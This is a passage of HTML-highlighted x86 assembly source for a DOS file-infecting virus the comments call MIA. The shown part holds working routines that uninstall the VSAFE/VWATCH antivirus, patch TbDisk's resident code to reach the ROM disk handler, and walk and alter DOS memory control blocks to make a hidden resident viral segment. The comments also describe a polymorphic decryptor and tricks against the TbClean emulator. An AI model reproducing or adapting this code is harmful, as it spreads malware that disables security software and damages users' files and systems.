 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0014h</span><span class="sc0">

</span><span class="sc5">Click</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; Control the 8253/8254 PIT mode</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0DCh</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; Send AL to PIT counter 2</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; Send AL to PIT counter 2</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">                 </span><span class="sc1">; Read from system control port</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                 </span><span class="sc1">; Open timer 2 clock speaker gate</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; Send it to port</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8000h</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Wait a sec...</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0">                </span><span class="sc1">; Turn off speaker sound</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">Click</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Delay</span><span class="sc0">                  </span><span class="sc1">; Do some delay</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Seek_Block</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FA01h</span><span class="sc0">              </span><span class="sc1">; Uninstall VSAFE &amp; VWATCH</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">5945h</span><span class="sc0">               </span><span class="sc1">; 'YE'</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">16h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">; Get LoL (List-of-Lists) vector = ES:[BX]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ES:[BX-02h] = First MCB (DOS MCB)</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">More_Block</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; Set SI equal to zero</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">44h</span><span class="sc0">   </span><span class="sc1">; 'D' - installed device driver (subsegment MCB)</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Subsegment</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">4Dh</span><span class="sc0">   </span><span class="sc1">; 'M' - valid MCB signature</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">True_Block</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">               </span><span class="sc1">; If MCB in chain, there must be a PSP</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; Patching TbDisk v7/v8 resident portion,  this is done by altering a byte in</span><span class="sc0">
</span><span class="sc1">; its resident segment. it's used to get the original ROM entry point of disk</span><span class="sc0">
</span><span class="sc1">; interrupt handler (TbDisk intercepts  that function and  returning its disk</span><span class="sc0">
</span><span class="sc1">; interrupt handler as ROM entry point). below's TbDisk v8.08's multiplex INT</span><span class="sc0">
</span><span class="sc1">; handler:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     0CCB:00AB  9C                 PUSHF</span><span class="sc0">
</span><span class="sc1">;     0CCB:00AC  80 FC 13           CMP     AH,13 ƒƒƒ Set disk INT handler?</span><span class="sc0">
</span><span class="sc1">;     0CCB:00AF  74 06              JZ      00B7 ƒƒƒ Jump if yes</span><span class="sc0">
</span><span class="sc1">;     0CCB:00B1  9D                 POPF</span><span class="sc0">
</span><span class="sc1">;     0CCB:00B2  EA D6 01 F9 0B     JMP     0BF9:01D6 ƒƒƒ Relative address</span><span class="sc0">
</span><span class="sc1">;     0CCB:00B7  2E F6 06 16 00 01  TEST    CS:BYTE PTR [0016],01</span><span class="sc0">
</span><span class="sc1">;     0CCB:00BD  2E 87 16 4E 00     XCHG    DX,CS:[004E]</span><span class="sc0">
</span><span class="sc1">;     0CCB:00C2  2E 8E 06 50 00     MOV     ES,CS:[0050]</span><span class="sc0">
</span><span class="sc1">;     0CCB:00C7  2E 8C 1E 50 00     MOV     CS:[0050],DS</span><span class="sc0">
</span><span class="sc1">;     0CCB:00CC  06                 PUSH    ES</span><span class="sc0">
</span><span class="sc1">;     0CCB:00CD  1F                 POP     DS</span><span class="sc0">
</span><span class="sc1">;     0CCB:00CE  8B DA              MOV     BX,DX</span><span class="sc0">
</span><span class="sc1">;     0CCB:00D0  9D                 POPF</span><span class="sc0">
</span><span class="sc1">;     0CCB:00D1  CF                 IRET</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Subsegment</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">4254h</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">True_Block</span><span class="sc0">             
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">00BBh</span><span class="sc0">               </span><span class="sc1">; Well, adjust offset instead of change DS</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">809Ch</span><span class="sc0">               </span><span class="sc1">; PUSHF + CMP X,Y</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Watchdog</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5655h</span><span class="sc0">               </span><span class="sc1">; PUSH  BP SI ?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">True_Block</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc2">454Dh</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">True_Block</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">],</span><span class="sc2">0D9h</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">True_Block</span><span class="sc0">

</span><span class="sc5">Watchdog</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">13FCh</span><span class="sc0">               </span><span class="sc1">; X = AH, Y = 13</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">True_Block</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F98Ch</span><span class="sc0">              </span><span class="sc1">; JZ  $ + 06</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">True_Block</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0EA9Dh</span><span class="sc0">              </span><span class="sc1">; POPF + JMP  FAR XXXX:YYYY</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">True_Block</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">       </span><span class="sc1">; Patch it!</span><span class="sc0">

</span><span class="sc5">True_Block</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">                           
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; Add with segment of first byte beyond allocated</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; memory.   </span><span class="sc0">
 </span><span class="sc6">adc</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Used_Block</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">Used_Block</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">5Ah</span><span class="sc0">   </span><span class="sc1">; 'Z' - the last MCB in chain</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">More_Block</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">5Ah</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒ[ Entry point (after decryption) of .BIN, .COM, .EXE, files ]ƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Vanguard</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">Grind</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1983h</span><span class="sc0">               </span><span class="sc1">; Yohoo...! MIA... My cutie...!</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0BABEh</span><span class="sc0">              </span><span class="sc1">; Are You there, sweetheart??</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0FEEDh</span><span class="sc0">              </span><span class="sc1">; Is that really You, honey??</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0BDh</span><span class="sc0">                   </span><span class="sc1">; MOV BP,XXXX</span><span class="sc0">

</span><span class="sc5">Delta</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBeg</span><span class="sc0">       </span><span class="sc1">; Relocation constant</span><span class="sc0">

 </span><span class="sc6">sti</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">; uhm... *smack*</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DADAh</span><span class="sc0">              </span><span class="sc1">; This is alternative call, if MIA has been</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">                    </span><span class="sc1">; resident (on booting) but hasn't hooked INT 21h</span><span class="sc0">

</span><span class="sc5">Returned</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                 </span><span class="sc1">; Obtain DOS version,</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">; this check is lame 'cause can be easily faked</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; by changing the word at PSP:0040h, instead</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Loaded</span><span class="sc0">                 </span><span class="sc1">; we can use AX=3306h to do it for DOS v5.00+</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Seek_Block</span><span class="sc0">             </span><span class="sc1">; Search for last MCB in chain</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                     </span><span class="sc1">; SI = current PSP segment</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                     </span><span class="sc1">; SI = current PSP's MCB</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">ParSiz</span><span class="sc0">              </span><span class="sc1">; Subtract needed number of paragraphs</span><span class="sc0">
 </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">Unfit</span><span class="sc0">                  </span><span class="sc1">; Jump if there's enough space for us</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Is the last MCB in chain a free block?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Free_Block</span><span class="sc0">             </span><span class="sc1">; Yes, so jump</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; Is it the host program's MCB ?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Free_Block</span><span class="sc0">             </span><span class="sc1">; Bomb if yes</span><span class="sc0">

</span><span class="sc5">Unfit</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc0">                 </span><span class="sc1">; 'M'</span><span class="sc0">

</span><span class="sc5">Unable</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                  
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; DS = CX = SI = host's MCB</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get its size</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">ParSiz</span><span class="sc0">              </span><span class="sc1">; Subtract needed paragraphs number from it</span><span class="sc0">
 </span><span class="sc6">ja</span><span class="sc0">     </span><span class="sc5">Free_Block</span><span class="sc0">             </span><span class="sc1">; Branch if enough space</span><span class="sc0">

</span><span class="sc5">Another_Block</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; Try another block...</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                  
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Unable</span><span class="sc0">     

</span><span class="sc5">Loaded</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">11h</span><span class="sc0">                    </span><span class="sc1">; Obtain BIOS equipment list byte</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0410h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; This is the same as invoking INT 11h above,</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Backward</span><span class="sc0">     </span><span class="sc1">; so AX will be zero, but some emulators, for</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">; instance, TbClean passes INT 11h, so what'll</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">; happen then? crash!! (but I doubt whether</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; TbClean can reach this point, since it always</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; stops within polymorphic decryptor).</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Scrap</span><span class="sc0">                  </span><span class="sc1">; Decrypt file header</span><span class="sc0">

</span><span class="sc5">Free_Block</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">
 </span><span class="sc6">adc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">; AX = our brand-new viral segment</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">; Get delta offset,</span><span class="sc0">
 </span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; convert it into paragraphs</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Just to make sure...</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Low_Block</span><span class="sc0">              </span><span class="sc1">; CF=0 ƒƒƒ new segment is below host's MCB ??</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,-((</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc6">jnbe</span><span class="sc0">   </span><span class="sc5">Another_Block</span><span class="sc0">          </span><span class="sc1">; ??</span><span class="sc0">

</span><span class="sc5">Low_Block</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">4Dh</span><span class="sc0">   </span><span class="sc1">; It will be no longer the last MCB</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Modify last block size</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">20CDh</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Invalid_PSP</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc5">ParSiz</span><span class="sc0">

</span><span class="sc5">Invalid_PSP</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; ES = MIA's first transient segment</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Forward</span><span class="sc0">                </span><span class="sc1">; Build viral MCB</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Mutant</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">; BP contains the Beginning-Of-Virus</span><span class="sc0">
